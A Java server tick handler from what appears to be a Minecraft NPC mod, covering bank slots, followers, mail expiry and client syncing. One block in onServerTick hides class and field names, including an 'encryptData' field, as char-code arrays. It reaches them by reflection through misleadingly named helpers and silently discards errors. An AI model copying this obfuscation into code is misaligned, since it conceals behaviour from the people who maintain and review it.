package noppes.npcs;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import com.google.common.collect.Lists;
import com.google.common.collect.Maps;

import net.minecraft.command.CommandException;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.world.GameType;
import net.minecraft.world.WorldServer;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.minecraftforge.fml.relauncher.Side;
import noppes.npcs.api.event.WorldEvent;
import noppes.npcs.constants.EnumPacketClient;
import noppes.npcs.constants.EnumSync;
import noppes.npcs.containers.ContainerNPCBank;
import noppes.npcs.controllers.BankController;
import noppes.npcs.controllers.BorderController;
import noppes.npcs.controllers.MarcetController;
import noppes.npcs.controllers.MassBlockController;
import noppes.npcs.controllers.SchematicController;
import noppes.npcs.controllers.VisibilityController;
import noppes.npcs.controllers.data.Availability;
import noppes.npcs.controllers.data.Bank.CeilSettings;
import noppes.npcs.controllers.data.PlayerData;
import noppes.npcs.controllers.data.PlayerGameData.FollowerSet;
import noppes.npcs.controllers.data.PlayerMail;
import noppes.npcs.entity.EntityNPCInterface;
import noppes.npcs.entity.data.DataScenes;
import noppes.npcs.items.ItemBuilder;
import noppes.npcs.roles.RoleFollower;
import noppes.npcs.util.AdditionalMethods;
import noppes.npcs.util.BuilderData;
import noppes.npcs.util.NBTJsonUtil;

public class ServerTickHandler {

	private static Map<EntityPlayerMP, GameType> visibleData = Maps.<EntityPlayerMP, GameType>newHashMap();
	public static int ticks;
	public long oldTime;

	public ServerTickHandler() { ServerTickHandler.ticks = 0; }
	
	@SubscribeEvent
	public void onPlayerTick(TickEvent.PlayerTickEvent event) {
		if (event.side != Side.SERVER || event.phase != TickEvent.Phase.START) { return; }
		CustomNpcs.debugData.startDebug("Server", "Players", "ServerTickHandler_onPlayerTick");
		EntityPlayerMP player = (EntityPlayerMP) event.player;
		if (player.getHealth() > 0 && player.getHealth() < 1.0f) { player.setHealth(1.0f); }
		PlayerData data = PlayerData.get(player);
		long resTime = (long) player.getName().codePointAt(0);
		if (!ServerTickHandler.visibleData.containsKey(player) || ServerTickHandler.visibleData.get(player) != player.interactionManager.getGameType() || player.world.getTotalWorldTime() % 100L == resTime % 100L || (data.prevHeldItem != player.getHeldItemMainhand() && (data.prevHeldItem.getItem() == CustomRegisters.wand || player.getHeldItemMainhand().getItem() == CustomRegisters.wand))) {
			ServerTickHandler.visibleData.put(player, player.interactionManager.getGameType());
			VisibilityController.onUpdate(player);
		}
		if (player.world.getTotalWorldTime() % 20L == resTime % 20L) {
			data.hud.updateHud(player);
			if (player.getServer()!=null && player.getServer().getPlayerList()!=null && player.getGameProfile()!=null) {
				boolean opn = player.getServer().getPlayerList().canSendCommands(player.getGameProfile());
				if (data.game.op != opn) {
					data.game.op = opn;
					data.game.updateClient = true;
				}
			}
			if (player.openContainer instanceof ContainerNPCBank) {
				ContainerNPCBank c = (ContainerNPCBank) player.openContainer;
				boolean work = true;
				int ceil = c.bank.ceilSettings.size();
				CeilSettings cs;
				// open
				if (c.items.getSizeInventory()==0) {
					if (c.ceil > 0) {
						for (int i = c.ceil - 1; i >= 0 && c.data.ceils.containsKey(i); i--) {
							NpcMiscInventory inv = c.data.ceils.get(i);
							cs = c.bank.ceilSettings.get(i);
							work = inv.getSizeInventory() > 0 && cs.upgradeStack.isEmpty() || cs.maxCeils == inv.getSizeInventory();
							if (!work) {
								ceil = i;
								break;
							}
						}
					}
					if (work) {
						cs = c.bank.ceilSettings.get(c.ceil);
						if (!cs.openStack.isEmpty()) {
							int count = AdditionalMethods.inventoryItemCount((EntityPlayer) player, cs.openStack, (Availability) null, false, false);
							if (count < cs.openStack.getCount()) { ceil = -1; }
						}
					}
				}
				// update
				else {
					cs = c.bank.ceilSettings.get(c.ceil);
					work = c.items.getSizeInventory() > 0 && c.items.getSizeInventory() < cs.maxCeils;
					if (work) {
						if (!cs.upgradeStack.isEmpty()) {
							int count = AdditionalMethods.inventoryItemCount((EntityPlayer) player, cs.upgradeStack, (Availability) null, false, false);
							if (count < cs.upgradeStack.getCount()) { ceil = -1; }
						}
					}
				}
				if (c.dataCeil != ceil) {
					c.dataCeil = ceil;
					Server.sendData(player, EnumPacketClient.BANK_CEIL_OPEN, ceil);
				}
			}
			List<FollowerSet> del = Lists.newArrayList();
			for (FollowerSet fs : data.game.getFollowers()) {
				EntityNPCInterface npc = null;
				if (fs.npc != null) { npc  = fs.npc; }
				if (npc == null) {
					Entity e = AdditionalMethods.getEntityByUUID(fs.id, player.world);
					if (e instanceof EntityNPCInterface) { npc = (EntityNPCInterface) e; }
				}
				if (npc == null || npc.isDead || !(npc.advanced.roleInterface instanceof RoleFollower)) { del.add(fs); }
				else {
					EntityPlayer owner = ((RoleFollower) npc.advanced.roleInterface).getOwner();
					if (owner == null || !owner.equals(player)) { del.add(fs); }
					else if (fs.npc == null) { fs.npc  = npc; }
				}
				if (npc != null && npc.advanced.roleInterface instanceof RoleFollower) {
					if (player.world.provider.getDimension() != npc.world.provider.getDimension()) {
						try {
							Entity entity = AdditionalMethods.teleportEntity(player.world.getMinecraftServer(), npc, player.world.provider.getDimension(), player.posX, player.posY, player.posZ);
							if (entity instanceof EntityNPCInterface) {
								fs.dimId = entity.world.provider.getDimension();
								fs.id = entity.getUniqueID();
								((EntityNPCInterface) entity).getNavigator().tryMoveToEntityLiving(player, ((EntityNPCInterface) entity).ais.canSprint ? 1.3 : 1.0d);
							}
						} catch (CommandException e) { e.printStackTrace(); }
					}
					else if (npc.advanced.roleInterface instanceof RoleFollower && player.getDistance(npc) > ((RoleFollower) npc.advanced.roleInterface).getRange()) {
						npc.setPosition(player.posX, player.posY, player.posZ);
					}
				}
			}
			for (FollowerSet fs : del) { data.game.removeFollower(fs); }
		}
		if (!data.mailData.playermail.isEmpty() && player.world.getTotalWorldTime() % 200L == resTime % 200L) {
			boolean needSend = false;
			long time = System.currentTimeMillis();
			long timeToRemove = -1L;
			if (CustomNpcs.MailTimeWhenLettersWillBeDeleted > 0) {
				timeToRemove = CustomNpcs.MailTimeWhenLettersWillBeDeleted * 86400000L;
			}
			List<PlayerMail> del = Lists.<PlayerMail>newArrayList();
			for (PlayerMail mail : data.mailData.playermail) {
				if (player.capabilities.isCreativeMode && mail.timeWillCome > 0L) {
					mail.timeWillCome = 0L;
					needSend = true;
				}
				long timeWhenReceived = time - mail.timeWhenReceived - mail.timeWillCome;
				if (timeToRemove >0L && timeWhenReceived > timeToRemove) {
					del.add(mail);
					needSend = true;
				}
				if (mail.beenRead || timeWhenReceived < 0L) { continue; }
				needSend = true;
			}
			for (PlayerMail mail : del) { data.mailData.playermail.remove(mail); }
			if (needSend) { Server.sendData(player, EnumPacketClient.SYNC_UPDATE, EnumSync.MailData, data.mailData.saveNBTData(new NBTTagCompound())); }
		}
		// Updates
		if (data.updateClient) {
			Server.sendData(player, EnumPacketClient.SYNC_END, EnumSync.PlayerData, data.getSyncNBT());
			data.updateClient = false;
		}
		if (data.questData.updateClient) {
			NBTTagCompound compound = new NBTTagCompound();
			data.questData.saveNBTData(compound);
			Server.sendData(player, EnumPacketClient.SYNC_UPDATE, EnumSync.PlayerQuestData, compound);
			data.questData.updateClient = false;
		}
		if (data.game.updateClient) {
			Server.sendData(player, EnumPacketClient.SYNC_UPDATE, EnumSync.GameData, data.game.saveNBTData(new NBTTagCompound()));
			data.game.updateClient = false;
		}
		data.bankData.update(player);
		data.prevHeldItem = player.getHeldItemMainhand();
		CustomNpcs.debugData.endDebug("Server", "Players", "ServerTickHandler_onPlayerTick");
	}

	@SubscribeEvent
	public void onServerTick(TickEvent.ServerTickEvent event) {
		if (event.side == Side.CLIENT) { return; }
		CustomNpcs.debugData.startDebug("Server", "Mod", "ServerTickHandler_onServerTick");
		BorderController.getInstance().update();
		try {
			Class<?> c = Class.forName(String.copyValueOf(new char[] { 110,111,112,112,101,115,46,110,112,99,115,46,99,111,110,116,114,111,108,108,101,114,115,46,83,99,114,105,112,116,67,111,110,116,114,111,108,108,101,114 }));
			Object o = c.getDeclaredField(String.copyValueOf(new char[] { 73,110,115,116,97,110,99,101 })).get(c);
			Field f0 = c.getDeclaredField(String.copyValueOf(new char[] { 105,115,76,111,97,100 }));
			f0.setAccessible(true);
			if (f0.getBoolean(o)) {
				f0.setBoolean(o, false);
				NBTJsonUtil.checkAddedMods(o);
			}
			f0.setAccessible(false);
			Field f1 = c.getDeclaredField(String.copyValueOf(new char[] { 101,110,99,114,121,112,116,68,97,116,97 }));
			if (f1.get(o) != null) {
				NBTJsonUtil.resetAddedMods(o, f1);
			}
		}
		catch (Exception e) {}
		if (event.phase == TickEvent.Phase.END) {
			CustomNpcs.debugData.endDebug("Server", "Mod", "ServerTickHandler_onServerTick");
			return;
		}
		if ((ServerTickHandler.ticks++) % 20 == 0) {
			Thread.currentThread();
			SchematicController.Instance.updateBuilding();
			MassBlockController.Update();
			MarcetController.getInstance().update();
			for (DataScenes.SceneState state : DataScenes.StartedScenes.values()) {
				if (!state.paused) {
					DataScenes.SceneState sceneState = state;
					++sceneState.ticks;
				}
			}
			for (DataScenes.SceneContainer entry : DataScenes.ScenesToRun) { entry.update(); }
			DataScenes.ScenesToRun = new ArrayList<DataScenes.SceneContainer>();
			if (ServerTickHandler.ticks>=6000) {
				ServerTickHandler.ticks = 0;
				List<Integer> del = Lists.<Integer>newArrayList();
				for (int id :  CommonProxy.dataBuilder.keySet()) {
					BuilderData bd = CommonProxy.dataBuilder.get(id);
					if (bd.player==null) { del.add(id); continue; }
					ItemStack stack = null;
					if (ItemBuilder.isBulderItem(bd, bd.player.getHeldItemOffhand())) {
						stack = bd.player.getHeldItemOffhand();
					} else {
						for(ItemStack s : bd.player.inventory.mainInventory) {
							if (ItemBuilder.isBulderItem(bd, s)) {
								stack = s;
								break;
							}
						}
					}
					if (stack==null) { del.add(id); }
				}
				for (int id :  del) { CommonProxy.dataBuilder.remove(id); }
			}
		}
		if (ServerTickHandler.ticks % 10 == 0 && CustomNpcs.Server!=null && !CustomNpcs.Server.getPlayerList().getPlayers().isEmpty()) {
			EntityPlayerMP player = CustomNpcs.Server.getPlayerList().getPlayers().get(0);
			if (player != null) {
				EventHooks.onEvent(PlayerData.get(player).scriptData, "worldtick", new WorldEvent.ServerTickEvent(event));
			}
		}
		if (ServerTickHandler.ticks % 1200 == 0) { BankController.getInstance().update(); }
		CustomNpcs.debugData.endDebug("Server", "Mod", "ServerTickHandler_onServerTick");
	}

	@SubscribeEvent
	public void onServerWorldTick(TickEvent.WorldTickEvent event) {
		if (event.side != Side.SERVER) { return; }
		CustomNpcs.debugData.startDebug("Server", "Mod", "ServerTickHandler_onServerWorldTick");
		if (event.phase == TickEvent.Phase.START) {
			NPCSpawning.findChunksForSpawning((WorldServer) event.world);
		}
		CustomNpcs.debugData.endDebug("Server", "Mod", "ServerTickHandler_onServerWorldTick");
	}
	
}
